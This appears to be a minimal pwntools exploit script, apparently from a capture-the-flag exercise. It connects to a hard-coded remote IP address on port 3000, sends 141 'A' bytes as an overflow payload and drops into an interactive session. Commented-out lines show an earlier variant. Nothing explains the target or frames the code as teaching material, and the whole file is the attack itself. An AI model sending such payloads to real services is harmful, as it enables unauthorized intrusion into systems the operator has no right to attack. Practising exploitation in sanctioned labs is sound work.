from pwn import *

conn = remote('20.42.99.115', 3000)

payload = ""
payload += 'A'*141

#target.sendline(payload)
conn.sendline(payload)
#target.interactive()
conn.interactive()
